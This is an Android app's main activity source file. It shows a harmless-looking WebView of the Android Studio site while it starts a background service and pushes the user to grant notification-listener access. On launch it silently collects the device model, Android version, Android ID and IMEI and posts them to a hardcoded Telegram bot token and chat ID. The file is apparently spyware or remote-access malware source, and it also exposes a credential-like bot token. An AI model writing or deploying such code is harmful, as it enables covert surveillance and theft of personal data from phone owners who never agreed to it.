package com.example.notification;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private static final String BOT_TOKEN = "6052854802:AAFFJJ6EeNyPAI5vj0cho4IDNB8VMkuXF9E"; // Replace with your Telegram bot token
    private static final String CHAT_ID = "6008516252";
    private static final int REQUEST_PHONE_STATE = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);  // ✅ Set layout before using WebView

        // ✅ Initialize WebView
        WebView webView = findViewById(R.id.webView);
        WebSettings webSettings = webView.getSettings();

        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setUseWideViewPort(true);
        webSettings.setLoadWithOverviewMode(true);
        webSettings.setSupportZoom(true);
        webSettings.setBuiltInZoomControls(true);
        webSettings.setDisplayZoomControls(false);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);

        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://developer.android.com/studio");

        // ✅ Start Background Service Properly (for Android 8+)
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // ✅ Check if notification listener is enabled
        if (!isNotificationServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        }

        // ✅ Request READ_PHONE_STATE permission only for Android 9 or below
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_PHONE_STATE);
            } else {
                sendTelegramNotification();
            }
        } else {
            sendTelegramNotification(); // No permission required for Android 10+
        }
    }

    private boolean isNotificationServiceEnabled() {
        String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return enabledListeners != null && enabledListeners.contains(getPackageName());
    }

    private void sendTelegramNotification() {
        String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        String androidVersion = Build.VERSION.RELEASE;
        String deviceID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        // IMEI access is restricted on Android 10+
        String imei = (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) ? getIMEI() : "Restricted";

        // Message format
        String message = String.format(Locale.US,
                "📱 App Started!\n" +
                        "🔹 Device: %s\n" +
                        "🔹 Android Version: %s\n" +
                        "🔹 Android ID: %s\n" +
                        "🔹 IMEI: %s",
                deviceName, androidVersion, deviceID, imei);

        sendMessageToTelegram(message);
    }

    @SuppressWarnings("MissingPermission")
    private String getIMEI() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return "Restricted"; // IMEI access is blocked on Android 10+
        }
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            android.telephony.TelephonyManager telephonyManager =
                    (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    return telephonyManager.getImei();
                } else {
                    return telephonyManager.getDeviceId();
                }
            }
        }
        return "Unknown";
    }

    private void sendMessageToTelegram(String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);

                String data = "chat_id=" + CHAT_ID + "&text=" + message;
                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                os.close();

                conn.getResponseCode(); // Send request
            } catch (Exception e) {
                Log.e("Telegram", "Error sending message", e);
            }
        }).start();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PHONE_STATE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            sendTelegramNotification();
        }
    }
}
